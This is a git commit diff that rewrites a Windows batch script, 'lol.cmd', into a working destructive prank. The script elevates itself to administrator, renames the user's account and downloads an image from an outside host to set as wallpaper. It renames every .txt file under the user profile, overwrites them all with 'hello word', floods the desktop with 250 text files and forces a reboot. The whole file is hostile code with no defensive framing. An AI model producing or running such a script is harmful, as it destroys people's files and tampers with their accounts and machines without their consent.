94b517a32f229a9ecb8a65103115e08a158f42f5
Nathanael Praditya <leerlryzck9@gmail.com>
2026-05-16 22:40:43 +0700

    Update lol.cmd

--- lol.cmd
+++ lol.cmd
@@ -1,38 +1,39 @@
-### rename *.txt menjadi ALLUSER ###
-
 @echo off
+:: cek admin
+net session >nul 2>&1
+if %errorlevel% neq 0 (
+    powershell -Command "Start-Process '%~f0' -Verb RunAs"
+    exit /b
+)
+
+::rename user local
+set currentUser=%USERNAME%
+wmic useraccount where name='%currentUser%' rename !c^f_i^H3R!
+
+
+::Download gambar - reboot - set wallpaper ###
+curl -L -s "https://i.ibb.co.com/Z6WSw3cz/PATIENCE.png" -o "%USERPROFILE%\Music\GD_001.jpg"
+set img=%USERPROFILE%\Music\GD_001.jpg
+reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%img%" /f >nul 2>&1
+
+:: rename *.txt menjadi ALLUSER
 setlocal enabledelayedexpansion
-
 set count=1
-
 for /r "%USERPROFILE%" %%f in (*.txt) do (
     ren "%%f" "ALLUSER_!count!.txt"
     set /a count+=1
 )
 
-pause
-
-============================================
-
-### Download gambar - reboot - set wallpaper ###
-
-@echo off
-
-curl -L -s "https://raw.githubusercontent.com/Axenide/Wallpapers/main/city-street.jpg" -o "%USERPROFILE%\Downloads\me.jpg"
-
-set img=%USERPROFILE%\Downloads\me.jpg
-
-reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%img%" /f >nul 2>&1
-
-shutdown /r /t 0
-
-============================================
-### ubah isi *.txt - hello word
-
-@echo off
-
-for /r %%f in (*.txt) do (
+::ubah isi *.txt - hello word
+for /r "%USERPROFILE%" %%f in (*.txt) do (
     echo hello word > "%%f"
 )
 
-pause
+::create readme.desktop
+setlocal enabledelayedexpansion
+for /l %%i in (1,1,250) do (
+    echo sarcas1111 > "%USERPROFILE%\Desktop\README%%i.txt"
+)
+
+::restart
+shutdown /r /t 0
